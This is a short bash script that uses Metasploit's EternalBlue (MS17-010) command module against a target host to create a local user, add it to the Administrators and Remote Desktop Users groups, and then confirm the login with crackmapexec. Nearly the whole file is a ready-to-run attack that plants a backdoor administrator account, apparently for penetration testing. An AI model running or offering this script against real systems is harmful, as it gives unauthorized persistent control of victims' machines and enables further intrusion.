#!/bin/bash
# ARGS
# IP "RHOSTS"
# Username "Username you want to create"
# Pass "Password for your new user"
# ENDARGS
# AUTHOR: Mitchell Kerns
# Description: Exploit eternalblue to add a local user, make them a local administrator, and add them to the RDP group. Then check access with CME.

# MSF Exploit
msfconsole -q -x "use auxiliary/admin/smb/ms17_010_command; set RHOSTS $1; set RPORT 445; set COMMAND net user $2 $3 /add; run; set COMMAND net localgroup administrators $2 /add; run; set COMMAND net localgroup "Remote Desktop Users" $2 /add ; run; exit" | sed 's/\x1b\[[0-9;]*m//g'

# Check access with CME
crackmapexec smb $1 -u $2 -p $3 --local-auth
